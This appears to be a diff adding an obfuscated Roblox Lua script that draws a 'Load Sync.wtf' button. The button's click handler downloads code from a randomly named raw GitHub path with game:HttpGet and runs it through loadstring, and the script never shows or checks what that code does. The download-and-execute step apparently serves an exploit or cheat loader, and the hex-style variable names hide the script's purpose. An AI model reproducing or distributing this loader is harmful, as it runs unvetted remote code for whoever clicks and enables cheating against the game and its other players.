@@ -1,1 +1,120 @@
+-- Services
+local _0x1 = game:GetService("Players")
+local _0x2 = game:GetService("TweenService")
 
+-- Player and GUI setup
+local _0x3 = _0x1.LocalPlayer
+local _0x4 = _0x3:WaitForChild("PlayerGui")
+
+-- Create a ScreenGui
+local _0x5 = Instance.new("ScreenGui")
+_0x5.Parent = _0x4
+
+-- Function to create UI with rounded corners and outline
+local _0x6 = function(_0x7)
+    local _0x8 = Instance.new("UICorner")
+    _0x8.CornerRadius = UDim.new(0.2, 0)
+    _0x8.Parent = _0x7
+
+    local _0x9 = Instance.new("UIStroke")
+    _0x9.Color = Color3.fromRGB(255, 85, 85)
+    _0x9.Thickness = 2
+    _0x9.Parent = _0x7
+end
+
+-- Create a Frame for the Button Box
+local _0xA = Instance.new("Frame")
+_0xA.Size = UDim2.new(0, 200, 0, 50)
+_0xA.Position = UDim2.new(0.5, -100, 0.5, -25)
+_0xA.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+_0xA.Parent = _0x5
+_0x6(_0xA)
+
+-- Create a TextButton inside the Frame
+local _0xB = Instance.new("TextButton")
+_0xB.Size = UDim2.new(1, 0, 1, 0)
+_0xB.BackgroundTransparency = 1
+_0xB.Text = "Load Sync.wtf"
+_0xB.TextColor3 = Color3.fromRGB(255, 85, 85)
+_0xB.Font = Enum.Font.SourceSans
+_0xB.TextSize = 14
+_0xB.Parent = _0xA
+
+-- Add hover effect to the button box
+local _0xC = function()
+    _0xA.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+end
+
+local _0xD = function()
+    _0xA.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+end
+
+_0xB.MouseEnter:Connect(_0xC)
+_0xB.MouseLeave:Connect(_0xD)
+
+-- Custom notification function
+local _0xE = function(_0xF, _0x10)
+    local _0x11 = Instance.new("Frame")
+    _0x11.Size = UDim2.new(0, 150, 0, 30)  -- Smaller notification size
+    _0x11.Position = UDim2.new(0.5, -75, 0, -50)
+    _0x11.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    _0x11.Parent = _0x5
+    _0x6(_0x11)
+
+    local _0x12 = Instance.new("TextLabel")
+    _0x12.Size = UDim2.new(1, 0, 1, 0)
+    _0x12.Text = _0xF
+    _0x12.TextColor3 = Color3.fromRGB(255, 85, 85)
+    _0x12.Font = Enum.Font.SourceSans
+    _0x12.TextSize = 12  -- Smaller text size
+    _0x12.TextWrapped = true
+    _0x12.BackgroundTransparency = 1
+    _0x12.Parent = _0x11
+
+    local _0x13 = _0x2:Create(
+        _0x11,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Position = UDim2.new(0.5, -75, 0, 20)}  -- Adjust position for smaller notification
+    )
+    _0x13:Play()
+
+    task.delay(_0x10, function()
+        local _0x14 = _0x2:Create(
+            _0x11,
+            TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+            {Position = UDim2.new(0.5, -75, 0, -50), Transparency = 1}
+        )
+        _0x14:Play()
+
+        _0x14.Completed:Connect(function()
+            _0x11:Destroy()
+        end)
+    end)
+end
+
+-- Button click event
+_0xB.MouseButton1Click:Connect(function()
+    _0xE("Sync.wtf loading", 3)
+
+    local _0x15 = _0x2:Create(
+        _0xA,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {
+            Size = UDim2.new(0, 150, 0, 40),
+            Position = UDim2.new(0.5, -75, 0.5, -20)
+        }
+    )
+    _0x15:Play()
+    _0x15.Completed:Wait()
+
+    _0xA.Visible = false
+
+    local _0x16 = "https://raw.githubusercontent.com/23jsdfs7823is/ki43lapw3elfdss2/refs/heads/main/213kjsdfg92pu54"
+    local _0x17, _0x18 = pcall(function()
+        loadstring(game:HttpGet(_0x16))()
+    end)
+
+    if not _0x17 then
+        warn("Error loading script: " .. _0x18)
+    end
+end)
